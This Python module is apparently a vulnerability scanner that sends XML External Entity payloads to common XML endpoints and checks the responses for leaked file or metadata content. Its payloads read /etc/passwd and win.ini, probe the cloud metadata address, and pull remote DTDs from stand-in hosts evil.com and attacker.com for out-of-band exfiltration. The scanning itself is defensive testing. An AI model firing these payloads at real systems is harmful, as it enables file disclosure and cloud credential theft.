"""
XML External Entity (XXE) vulnerability testing for the Dynamic Analysis Agent.
"""

import requests
from urllib.parse import urljoin

def test_xxe(base_url):
    """
    Test for XML External Entity (XXE) vulnerabilities.

    Args:
        base_url (str): Base URL to test

    Returns:
        list: List of detected vulnerabilities
    """
    vulnerabilities = []

    xxe_payloads = [
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>""",
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://evil.com/malicious.dtd">
%dtd;
]>
<data>&send;</data>""",
        """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
%ext;
]>
<root>&evil;</root>"""
    ]

    test_endpoints = [
        urljoin(base_url, "/xml"),
        urljoin(base_url, "/parse"),
        urljoin(base_url, "/upload"),
        urljoin(base_url, "/api/xml"),
        urljoin(base_url, "/soap"),
        urljoin(base_url, "/xmlrpc")
    ]

    for endpoint in test_endpoints:
        for payload in xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = requests.post(endpoint, data=payload, headers=headers, timeout=5)

                # Check for XXE indicators
                response_text = response.text.lower()

                # Common XXE detection patterns
                xxe_indicators = [
                    "root:", "daemon:", "bin/bash", "bin/sh",  # File content disclosure
                    "meta-data", "iam/security-credentials",  # Cloud metadata
                    "xml parsing error", "entity", "doctype",  # XML parsing issues
                    "external entity", "xxe"  # Error messages mentioning XXE
                ]

                if any(indicator in response_text for indicator in xxe_indicators):
                    vulnerabilities.append({
                        "type": "XML External Entity (XXE)",
                        "endpoint": endpoint,
                        "payload": payload[:100] + "..." if len(payload) > 100 else payload,
                        "method": "POST",
                        "evidence": "XXE indicators detected in response"
                    })

                # Check for file content patterns (strong evidence)
                file_patterns = [
                    "root:x:", "/bin/", "/usr/", "/etc/",
                    "[extensions]", "[fonts]"  # Windows INI patterns
                ]

                if any(pattern in response_text for pattern in file_patterns):
                    vulnerabilities.append({
                        "type": "XML External Entity (XXE)",
                        "endpoint": endpoint,
                        "payload": payload[:100] + "..." if len(payload) > 100 else payload,
                        "method": "POST",
                        "evidence": "File content disclosure detected"
                    })

            except requests.RequestException:
                continue

    return vulnerabilities
